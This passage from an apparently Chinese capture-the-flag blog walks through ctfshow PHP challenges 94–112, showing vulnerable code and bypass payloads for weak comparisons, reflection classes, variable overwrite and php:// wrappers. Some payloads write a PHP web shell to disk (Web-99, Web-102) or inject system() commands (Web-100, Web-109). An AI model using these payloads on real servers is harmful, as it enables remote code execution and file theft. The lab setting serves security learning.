aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>正则表达式过滤了<code>[a-z]</code>字母，可使用intval八进制(010574)绕过</p><h1 id="Web-94-intval-小数点绕过"><a href="#Web-94-intval-小数点绕过" class="headerlink" title="Web-94 intval 小数点绕过"></a>Web-94 intval 小数点绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>比较上一关出现了strpos()函数，函数说明</p><ul><li>查找关键字在字符串中第一次出现的位置</li><li>对大小写敏感</li><li>返回字符串在另一字符串中第一次出现的位置，如果没有字符串则返回FALSE。</li></ul><p><code>!strpos($num, &quot;0&quot;)</code>限制了传参时第一位不能为0，如果第一位为0，则die，在字符串中找不到0，也会die。</p><p>payload可为：</p><p>空格+八进制：<code> 010574</code></p><p>小数点+0：<code>4476.0</code></p><p>头部加号+尾部小数点：<code>+4476.0</code></p><h1 id="Web-95-intval-空格绕过"><a href="#Web-95-intval-空格绕过" class="headerlink" title="Web-95 intval 空格绕过"></a>Web-95 intval 空格绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>过滤了小数点，可用<code>空格+八进制绕过</code>：<code> 010574</code></p><p>也可用<code>URL编码+八进制绕过</code>：<code>%20010574</code>or<code>%0a010574</code></p><h1 id="Web-96-绝对路径，相对路径"><a href="#Web-96-绝对路径，相对路径" class="headerlink" title="Web-96 绝对路径，相对路径"></a>Web-96 绝对路径，相对路径</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_GET[&#39;u&#39;]))&#123;    if($_GET[&#39;u&#39;]&#x3D;&#x3D;&#39;flag.php&#39;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#39;u&#39;]);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>不能直接读取<code>flag.php</code>，</p><p>绝对路径读取：<code>/var/www/html/flag.php</code></p><p>相对路径读取：<code>./flag.php</code></p><p>两者皆可读取flag</p><h1 id="Web-97-md5强比较"><a href="#Web-97-md5强比较" class="headerlink" title="Web-97 md5强比较"></a>Web-97 md5强比较</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;])if (md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))echo $flag;elseprint &#39;Wrong.&#39;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>强比较：如果传入md5函数的不是数值和字符串，而是对象，那么就会返回null，null===null为True，成功绕过</p><p>payload：<code>a[]=1&amp;b[]=2</code></p><h1 id="Web-98-三元运算"><a href="#Web-98-三元运算" class="headerlink" title="Web-98 三元运算"></a>Web-98 三元运算</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><code>$_GET?$_GET=&amp;$_POST:&#39;flag&#39;;</code>和<code>$_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;</code>是重点只需GET方式随便获取一个值，使POST赋值到GET，以POST方式传输<code>HTTP_FLAG=flag</code>即可</p><p>payload:GET:<code>?a=a</code>,POST:<code>HTTP_FLAG=flag</code></p><h1 id="Web-99-in-array绕过"><a href="#Web-99-in-array绕过" class="headerlink" title="Web-99 in_array绕过"></a>Web-99 in_array绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$allow &#x3D; array();for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h2><p>in_array — 检查数组中是否存在某个值</p><p>语法：</p><blockquote><p>in_array ( <a href="ms-its://ms-its/res/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong><code>FALSE</code></strong> ] ) : bool</p></blockquote><p>在<code>$haystack</code>中寻找<code>$needle</code>，如果没有设置<code>$strict</code>，则为弱比较。</p><p>因此，<code>$_GET[&#39;n&#39;]</code>传入值为<code>1.php</code>时弱等于<code>1</code>.</p><p>payload:</p><p>GET:<code>?n=1.php</code></p><p>POST:<code>content=&lt;?php eval($_POST[1]);?&gt;</code></p><p>然后打开<code>1.php</code>通过POST执行命令即可</p><h1 id="Web-100-反射类及运算符优先级"><a href="#Web-100-反射类及运算符优先级" class="headerlink" title="Web-100 反射类及运算符优先级"></a>Web-100 反射类及运算符优先级</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>考察点：and 和 &amp;&amp; 的优先级以及<strong>反射类</strong><code>ReflectionClass</code></p><p>PHP运算符比较：<code>&amp;&amp;</code>&gt;<code>||</code>&gt;<code>=</code>&gt;<code>and</code>&gt;<code>or</code></p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">$a&#x3D;true and false and false;var_dump($a);&#x2F;&#x2F;返回True$a&#x3D;true &amp;&amp; false &amp;&amp; false;var_dump($a);&#x2F;&#x2F;返回False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>因此，<code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code>只需v1为数字即可进入if。</p><p>两个判断中，要求<code>$v2</code>不包含;<code>$v3</code>包含;</p><p>根据反射类文档，可构造出<code>echo new ReflectionClass(&#39;ctfshow&#39;);</code>获取flag</p><p>构造URL Payload：<code>/?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><p>非预期解payload</p><p><code>v1=1&amp;v2=var_dump(&#39;ctfshow&#39;)/*&amp;v3=*/;</code></p><p><code>v1=1&amp;v2=?&gt;&lt;?php echo &#39;ls&#39;?&gt;/*&amp;v3=;*/</code></p><p><code>v1=1&amp;v2=-system(&#39;ls&#39;)-&amp;v3=-1;</code></p><h1 id="Web-101-反射类"><a href="#Web-101-反射类" class="headerlink" title="Web-101 反射类"></a>Web-101 反射类</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\;|\?|[0-9]&#x2F;&quot;, $v2))&#123;        if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\?|[0-9]&#x2F;&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>与上一题相同，过滤更严格，直接通过反射类ReflectionClass获取Flag。</p><h1 id="Web-102-103-hex2bin"><a href="#Web-102-103-hex2bin" class="headerlink" title="Web-102,103 hex2bin"></a>Web-102,103 hex2bin</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$v1 &#x3D; $_POST[&#39;v1&#39;];$v2 &#x3D; $_GET[&#39;v2&#39;];$v3 &#x3D; $_GET[&#39;v3&#39;];$v4 &#x3D; is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s &#x3D; substr($v2,2);    $str &#x3D; call_user_func($v1,$s);    echo $str;    file_put_contents($v3,$str);&#125;else&#123;    die(&#39;hacker&#39;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><strong>本题知识点：</strong>hex2bin(),is_numeric(),call_user_func(),file_put_contents()</p><h2 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h2><p>在PHP5中，hex2bin可将十六进制字符串转换为二进制字符串</p><p>本题中用于将木马编写为16进制字符串</p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>检测变量是否为数字或为数字字符串</p><p>在PHP5中，可识别十六进制字符串，可进行<code>0x</code>截断，经过截断后得到不带0x的16进制的木马文件</p><p>不过此环境是PHP7，不可以。</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p>把第一个参数作为回调函数调用，其余都是回调函数的参数</p><p>在本题中，通过<code>substr($v2,2)</code>截取从<code>2</code>开始以后的数值为<code>$s</code>，将<code>$s</code>作为<code>$v1(hex2bin)</code>的回调函数参数</p><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p>将一个字符串写入文件</p><p>语法：<code>file_put_contents($filename,$data);</code></p><p>本题中将<code>$str</code>中的内容写入<code>$v3</code>中</p><h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>综上所述，要让<code>$v2</code>均为数字，<code>$v3</code>利用伪协议写入</p><p>padload:</p><blockquote><p>GET:?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</p><p>POST:v1=hex2bin</p></blockquote><p><code>$v2</code>中的e为科学计数法，可以被is_numeric识别，带有其他字符不可以。</p><h1 id="Web-104-sha1弱等于"><a href="#Web-104-sha1弱等于" class="headerlink" title="Web-104 sha1弱等于"></a>Web-104 sha1弱等于</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_POST[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>此题没有难度，<code>sha1($v1)</code>弱等于<code>sha1($v2)</code>，也就是说两个值经过sha1加密后传入URL即可。</p><p><code>sha1：计算字符串的sha1散列值，返回sha1散列值字符串。</code></p><p>payload:</p><blockquote><p>GET:?v2=40bd001563085fc35165329ea1ff5c5ecbdbbeef</p><p>POST:v1=40bd001563085fc35165329ea1ff5c5ecbdbbeef</p></blockquote><p>其他解法：</p><p>sha1函数无法处理数组类型，报错返回false</p><p>payload:<code>GET:?v2[]=1</code>and<code>POST:v1[]=2</code></p><h1 id="Web-105-覆盖"><a href="#Web-105-覆盖" class="headerlink" title="Web-105 $$覆盖"></a>Web-105 $$覆盖</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&#39;flag.php&#39;);error_reporting(0);$error&#x3D;&#39;你还想要flag嘛？&#39;;$suces&#x3D;&#39;既然你想要那给你吧！&#39;;foreach($_GET as $key &#x3D;&gt; $value)&#123;    if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;    if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;if(!($_POST[&#39;flag&#39;]&#x3D;&#x3D;$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>本题考察点：变量覆盖</p><p>根据代码中三个<code>if</code>判断，GET中的值不能强等于<code>error</code>,POST中的值不能强等于<code>flag</code>且POST中的值需要弱等于<code>flag</code>否则die。</p><p>利用变量覆盖绕过</p><blockquote><p>$suces = $flag</p><p>$error = $suces</p></blockquote><p><code>$error</code>的值随着<code>$flag</code>的值变化而变化，将<code>$error</code>=<code>$flag</code>利用POST传输可以绕过对于POST的过滤，而<code>$suces</code>=<code>$flag</code>利用GET方式进行传输可绕过对GET的过滤，满足条件，构造payload。</p><blockquote><p>GET:?suces=flag</p><p>POST:error=suces</p></blockquote><h1 id="Web-106-sha1弱比较"><a href="#Web-106-sha1弱比较" class="headerlink" title="Web-106 sha1弱比较"></a>Web-106 sha1弱比较</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_POST[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2)&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>与第104题相似，不过多了一个条件，<code>$v1</code>与<code>$v2</code>之间sha1密文可以相同，但字符串不能相同，不能使用104题的方法进行绕过。</p><p>可进行数组绕过：</p><blockquote><p>GET:?v2[]=1</p><p>POST:v1[]=2</p></blockquote><p>如果强制类型转换，需要找sha1密文不同但解码出来的明文相同，以下：</p><blockquote><p>aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m</p></blockquote><h1 id="Web-107-md5弱比较"><a href="#Web-107-md5弱比较" class="headerlink" title="Web-107 md5弱比较"></a>Web-107 md5弱比较</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]))&#123;    $v1 &#x3D; $_POST[&#39;v1&#39;];    $v3 &#x3D; $_GET[&#39;v3&#39;];       parse_str($v1,$v2);       if($v2[&#39;flag&#39;]&#x3D;&#x3D;md5($v3))&#123;           echo $flag;       &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="parse-str函数"><a href="#parse-str函数" class="headerlink" title="parse_str函数"></a>parse_str函数</h2><p>将字符串解析成多个变量</p><p>语法:</p><blockquote><p>parse_str ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p></blockquote><p>如果设置了result变量，变量将会以数组的形式存入到这个数组作为替代。</p><p>根据题意，判断为md5的弱比较，需要使<code>$v2[&#39;flag&#39;]==md5($v3)</code>两边同时为FALSE或TRUE，</p><p>构造payload：</p><p><code>GET: ?v3[]=1    POST: v1=</code> 满足两边同时为NULL，NULL==NULL为TRUE，因此成立</p><p>or</p><p><code>GET: ?v3=1    POST: v1=flag=c4ca4238a0b923820dcc509a6f75849b</code> v1中的值为md5，两边弱比较为TRUE</p><p>或者使用<code>0e</code>开头的md5，采用00截断的方法绕过</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">0e开头的md5和原值：QNKCDZO0e8304004519934940580242199033912406107080e462097431906509019562988736854s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h1 id="Web-108-ereg-00截断"><a href="#Web-108-ereg-00截断" class="headerlink" title="Web-108 ereg %00截断"></a>Web-108 ereg %00截断</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;    die(&#39;error&#39;);&#125;&#x2F;&#x2F;只有36d的人才能看到flagif(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;    echo $flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><p>正则表达式匹配。如今已被<code>preg_match()</code>函数替代。</p><p><code>ereg()</code>用指定的模式搜索一个字符串中指定的字符串，如果匹配成功返回true，反之返回false。搜索的字符是大小写敏感的。<code>ereg()</code>存在NULL截断漏洞，导致正则过滤被绕过，可以使用%00截断正则匹配</p><h2 id="strrev"><a href="#strrev" class="headerlink" title="strrev"></a>strrev</h2><p>反转字符串</p><h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>获取变量的整数值。通过指定的进制<code>base</code>转换(默认十进制)</p><p>已知：通过正则表达式<code>ereg</code>字符串中需要包含字母通过if判断，且将字符串倒转以后<code>$_GET[&#39;c&#39;]</code>与<code>0x36d</code>弱相等。<code>887</code>为<code>0x36d</code>的10进制</p><p>综上所述，构造出payload</p><blockquote><p>a%00778</p></blockquote><p>由于<code>ereg</code>的漏洞，正则表达式只会匹配到<code>%00</code>之前的字符，后面的已经被截断，通过验证之后，将payload倒转成<code>877%00a</code>再用intval函数获取整数部分<code>887</code>。</p><h1 id="Web-109-反射类，异常类"><a href="#Web-109-反射类，异常类" class="headerlink" title="Web-109 反射类，异常类"></a>Web-109 反射类，异常类</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v1) &amp;&amp; preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v2))&#123;            eval(&quot;echo new $v1($v2());&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>考察点：PHP反射类、异常类</p><p>从<code>preg_match</code>正则表达式中可知匹配至少有一个字母的字符串。因此只要new后面有个类不报错就可以随意构造，并且可以直接执行系统命令。</p><p>反射类:<code>ReflectionClass</code></p><p>异常类:<code>Exception</code></p><p>payload:</p><blockquote><p>?v1=Exception;system(‘tac fl36dg.txt’);//&amp;v2=a</p><p>?v1=Exception&amp;v2=system(‘tac fl36dg.txt’)</p><p>?v1=RefletionClass&amp;v2=system(‘tac fl36dg.txt’)</p></blockquote><h1 id="Web-110-FilesystemIterator类"><a href="#Web-110-FilesystemIterator类" class="headerlink" title="Web-110 FilesystemIterator类"></a>Web-110 FilesystemIterator类</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>正则表达式过滤除字母外的所有字符，通过<code>FilesystemIterator</code>内置类绕过读取当前目录下的文件。PHP中的<code>getcwd()</code>可以做到</p><p>payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><p>读取到当前目录存在<code>fl36dga.txt</code>,浏览器直接访问得到flag。</p><h1 id="Web-111-GLOBALS全局变量"><a href="#Web-111-GLOBALS全局变量" class="headerlink" title="Web-111 GLOBALS全局变量"></a>Web-111 GLOBALS全局变量</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>php变量地址引用。利用全局变量赋值给ctfshow这个变量。</p><p>payload:<code>?v1=ctfshow&amp;v2=GLOBALS</code></p><h1 id="Web-112-is-file绕过-php伪协议"><a href="#Web-112-is-file绕过-php伪协议" class="headerlink" title="Web-112 is_file绕过,php伪协议"></a>Web-112 is_file绕过,php伪协议</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file)&#123;    if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file()"></a>is_file()</h2><p>is_file函数。判断给定文件名是否为一个正常的文件。</p><p>如果文件存在且为正常的文件则返回TRUE，否则返回FALSE。</p><p>审计代码后发现，如果文件名不为正常的文件，则高亮显示flag。</p><p>因此需要做到高亮显示flag文件但文件必须存在。</p><p>使用PHP伪协议进行绕过</p><h2 id="实验："><a href="#实验：" class="headerlink" title="实验："></a>实验：</h2><p>1.</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191106865.png" alt="image-20211201191106865"></p><p>当文件存在当前目录时，返回<code>TRUE</code></p><p>2.</p><p><img 